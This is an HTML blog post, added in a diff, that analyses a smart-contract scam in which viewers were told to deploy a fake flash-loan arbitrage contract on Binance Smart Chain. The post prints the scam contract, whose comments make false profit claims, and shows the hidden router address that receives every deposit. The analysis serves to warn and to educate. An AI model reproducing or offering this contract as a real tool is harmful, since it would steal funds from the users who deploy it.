@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="generator" content="Hugo 0.83.1" />
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="author" content="Ivan Kuznetsov">
+  <meta property="og:url" content="https://jeiwan.net/posts/flashloan-scam/">
+
+  <title>Analysis of a technical smart contract scam - Going the distance</title>
+  <meta property="og:title" content="Analysis of a technical smart contract scam - Going the distance">
+  <meta property="og:type" content="article">
+  <meta name="description" content="A blog about blockhains and smart contracts development">
+  <meta name="keywords" content="bitcoin, ethereum, evm, smart contract, blockchain, programming, development, solidity, vyper">
+
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro|Arvo:400,700">
+  <link rel="stylesheet" href="/css/prism.css">
+  <link rel="stylesheet" href="/css/journal.css">
+  <link href="/index.xml" rel="alternate" type="application/rss+xml" title="Going the distance">
+
+  
+
+  
+
+</head>
+
+<body>
+  <div class="container">
+
+    <nav class="site-nav">
+      <a href="https://jeiwan.net">Index</a>
+    </nav>
+
+
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">Analysis of a technical smart contract scam</h1>
+      <time class="post-date" datetime="2021-06-09 18:42:51 &#43;07">09 Jun 2021</time>
+    </header>
+
+    <h2 id="introduction">Introduction</h2>
+<p>I once came across a video on YouTube which was named &ldquo;How I earned BNB using Flashloans to Arbitrage on Binance Smartchain BSC&rdquo;.
+The title was quite catchy because everyone who followed the crypto field in the beginning of 2021 was aware of Binance
+Smart Chain (BSC), which is a clone of Ethereum, and definitely heard about multiple attacks on DeFi projects running on
+this blockchain.</p>
+<p>Following the success of DeFi on Ethereum, Binance created a copy of the blockchain and, allegedly, funded multiple
+projects that copied most successful and advanced DeFi-projects of Ethereum.
+Everything looked fine until a cascade of hacks that targeted projects on BSC in the Spring of 2021.</p>
+<p>Most of the attacks used a similar scheme:</p>
+<ol>
+<li>A DeFi contract had a flaw in token balances calculation.</li>
+<li>An attacker used a flash loan to inflate a token pool or vault.</li>
+<li>The attacker then exploited the flaw by doing a big trade or token swap and tricking the contract into thinking that all balances were correct.</li>
+<li>The flash loan was repaid and the attacker got away with some profit.</li>
+</ol>
+<p>So, for anyone who heard about those attacks it was hard to pass by (me included).</p>
+<h2 id="mechanics-of-the-scam">Mechanics of the scam</h2>
+<p>Author of the video shared how they managed to take a flash loan to make one arbitraging trade and earn several BNB
+(1 BNB costed around $400 back then).
+And, out of generosity, they shared the technique:</p>
+<ol>
+<li>Viewer was asked to deploy a smart contract that does all the job.</li>
+<li>To cover transaction fees, viewer was asked to deposit 0.25 BNB into the contract. The contract belonged to the viewer, so everything looked safe.</li>
+<li>Then, viewer needed to execute <code>flashloan</code> function of the contract.</li>
+</ol>
+<p>The author even uploaded the contract to <a href="https://remix.ethereum.org/">Remix</a>, an Ethereum online IDE, so viewer needed
+to only click a couple of buttons.</p>
+<p>It&rsquo;s not hard to guess that everyone how followed the instructions lost the 0.25 BNB they deposited into the contract
+and got nothing in return.
+At the time of writing, more than 44 BNB (more than $17 500) were withdrawn from attacker&rsquo;s address.</p>
+<h2 id="how-to-identify-the-scam">How to identify the scam</h2>
+<p>First thing that stands out is the 0.25 BNB fee: this is a very high transaction fee for BSC, you&rsquo;d hardly ever submit
+a transaction that costs that much.
+Apparently, the attacker didn&rsquo;t want it to be too suspicious and made the amount low enough to look like a real fee
+and big enough to satisfy their greed.</p>
+<p>Second, never ever run a contract if you don&rsquo;t know how it works.
+Here&rsquo;s the contract viewers were instructed to deploy (comments are added by its author):</p>
+<div class="highlight"><pre class="chroma"><code class="language-solidity" data-lang="solidity"><span class="kr">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+
+<span class="c1">// PancakeSwap Smart Contracts
+</span><span class="c1"></span><span class="kn">import</span> <span class="s">&#34;https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol&#34;</span><span class="p">;</span>
+<span class="kn">import</span> <span class="s">&#34;https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol&#34;</span><span class="p">;</span>
+
+<span class="c1">//BakerySwp Smart contracts
+</span><span class="c1"></span><span class="kn">import</span> <span class="s">&#34;https://github.com/BakeryProject/bakery-swap-core/blob/master/contracts/interfaces/IBakerySwapFactory.sol&#34;</span><span class="p">;</span>
+
+<span class="c1">// Router
+</span><span class="c1"></span><span class="kn">import</span> <span class="s">&#34;ipfs://QmUSQQNWBJ6snmx5FvafDSBCPCy63BLTpwM61dYjRzwLkN&#34;</span><span class="p">;</span>
+
+<span class="c1">// Multiplier-Finance Smart Contracts
+</span><span class="c1"></span><span class="kn">import</span> <span class="s">&#34;https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol&#34;</span><span class="p">;</span>
+<span class="kn">import</span> <span class="s">&#34;https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol&#34;</span><span class="p">;</span>
+
+<span class="kd">contract</span> <span class="n">InitiateFlashLoan</span> <span class="p">{</span>
+  <span class="n">RouterV2</span> <span class="n">router</span><span class="p">;</span>
+  <span class="kt">string</span> <span class="kr">public</span> <span class="n">tokenName</span><span class="p">;</span>
+  <span class="kt">string</span> <span class="kr">public</span> <span class="n">tokenSymbol</span><span class="p">;</span>
+  <span class="kt">uint256</span> <span class="n">flashLoanAmount</span><span class="p">;</span>
+
+  <span class="n">constructor</span><span class="p">(</span>
+    <span class="kt">string</span> <span class="kr">memory</span> <span class="n">_tokenName</span><span class="p">,</span>
+    <span class="kt">string</span> <span class="kr">memory</span> <span class="n">_tokenSymbol</span><span class="p">,</span>
+    <span class="kt">uint256</span> <span class="n">_loanAmount</span>
+  <span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+    <span class="n">tokenName</span> <span class="o">=</span> <span class="n">_tokenName</span><span class="p">;</span>
+    <span class="n">tokenSymbol</span> <span class="o">=</span> <span class="n">_tokenSymbol</span><span class="p">;</span>
+    <span class="n">flashLoanAmount</span> <span class="o">=</span> <span class="n">_loanAmount</span><span class="p">;</span>
+    <span class="n">router</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RouterV2</span><span class="p">();</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span><span class="p">()</span> <span class="kr">external</span> <span class="kr">payable</span> <span class="p">{}</span>
+
+  <span class="kd">function</span> <span class="n">flashloan</span><span class="p">()</span> <span class="kr">public</span> <span class="kr">payable</span> <span class="p">{</span>
+    <span class="c1">// Send required coins for swap
+</span><span class="c1"></span>    <span class="kt">address</span><span class="p">(</span><span class="kt">uint160</span><span class="p">(</span><span class="n">router</span><span class="p">.</span><span class="n">pancakeSwapAddress</span><span class="p">())).</span><span class="nb">transfer</span><span class="p">(</span>
+      <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span>
+    <span class="p">);</span>
+
+    <span class="c1">//Flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
+</span><span class="c1"></span>    <span class="n">router</span><span class="p">.</span><span class="n">borrowFlashloanFromMultiplier</span><span class="p">(</span>
+      <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span>
+      <span class="n">router</span><span class="p">.</span><span class="n">bakerySwapAddress</span><span class="p">(),</span>
+      <span class="n">flashLoanAmount</span>
+    <span class="p">);</span>
+
+    <span class="c1">//To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract.
+</span><span class="c1"></span>    <span class="n">router</span><span class="p">.</span><span class="n">convertBnbToBusd</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">flashLoanAmount</span> <span class="o">/</span> <span class="mi">2</span><span class="p">);</span>
+
+    <span class="c1">//The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.
+</span><span class="c1"></span>    <span class="n">router</span><span class="p">.</span><span class="n">callArbitrageBakerySwap</span><span class="p">(</span><span class="n">router</span><span class="p">.</span><span class="n">bakerySwapAddress</span><span class="p">(),</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
+
+    <span class="c1">//After the arbitrage, 3,148.38 BNB is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 BNB of gas.
+</span><span class="c1"></span>    <span class="n">router</span><span class="p">.</span><span class="n">transferBnbToMultiplier</span><span class="p">(</span><span class="n">router</span><span class="p">.</span><span class="n">pancakeSwapAddress</span><span class="p">());</span>
+
+    <span class="c1">//Note that the transaction sender gains 3.29 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.
+</span><span class="c1"></span>    <span class="n">router</span><span class="p">.</span><span class="n">completeTransation</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+</code></pre></div><p>Everything looks kind of ok:</p>
+<ol>
+<li>Real PancakeSwap, BakerySwap, and Multiplier-Finance contracts are imported.</li>
+<li>A router contract is imported (IPFS? huh?).</li>
+<li>Then there&rsquo;s <code>flashloan</code> function that sends contract&rsquo;s ethers to a PancakeSwap address, borrows a flash loan from
+Multiplier-Finance, makes an arbitraging swap, pays out the loan, and finally returns some profit to the contract.</li>
+</ol>
+<p>In fact, it does only one thing: it sends all BNB deposited into the contract, to attacker&rsquo;s address.
+That IPFS import definitely looks suspicious and there&rsquo;s a reason they used IPFS there: so it&rsquo;s harder to get the Router
+contract and see what it&rsquo;s doing.</p>
+<p>The Router contract contains a lot of lines to make it noisy and hard to read but it&rsquo;s not hard to find the only
+important part:</p>
+<div class="highlight"><pre class="chroma"><code class="language-solidity" data-lang="solidity"><span class="p">...</span>
+
+<span class="kd">contract</span> <span class="n">RouterV2</span> <span class="p">{</span>
+    <span class="p">...</span>
+    <span class="kd">function</span> <span class="n">pancakeSwapAddress</span><span class="p">()</span> <span class="kr">public</span> <span class="kr">pure</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="mh">0x2593F13d5b7aC0d766E5768977ca477F9165923a</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div><p>This is the address the main contract sends all funds to.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>This scam is an interesting case: most scams target non-tech savvy users of cryptocurrencies and this one
+targets those who are aware of flash loan attacks and who knows how to deploy smart contracts and how to interact with them directly.
+That is not a large audience but, <a href="https://bscscan.com/address/0x2593F13d5b7aC0d766E5768977ca477F9165923a#internaltx">as we can see</a>, many people have still fell
+victims of the scam.</p>
+<p>If you like reading about blockchain security and hacks, I highly recommend subscribing to <a href="https://blockthreat.substack.com/?utm_source=jeiwan.net&amp;utm_medium=blog&amp;utm_content=textlink">Blockchain Threat Intelligence</a> (I&rsquo;m not its author).</p>
+
+
+  </article>
+
+<hr>
+<br>
+
+
+
+
+      <footer class="site-footer">
+        <span itemscope itemtype="http://schema.org/Person">
+          <link itemprop="url" href="https://jeiwan.net">
+          <span itemprop="name">Ivan Kuznetsov</span>
+
+          <br>
+
+          <a itemprop="sameAs" href="https://github.com/jeiwan" title="GitHub" target="_blank">GH</a>
+
+          <a itemprop="sameAs" href="https://twitter.com/jeiwan7" title="Twitter" target="_blank">TW</a>
+
+          <a itemprop="sameAs" href="https://t.me/jeiwan" title="Telegram" target="_blank">TG</a>
+
+          
+        </span>
+
+        <br><br>
+
+        <div style="text-align:center">
+          <small>
+            <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png" /></a><br />Content of this site is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License</a>.
+          </small>
+        </div>
+
+        
+      </footer>
+    </div>
+
+  
+
+    <script src="/js/prism.js"></script>
+
+  </body>
+</html>
+
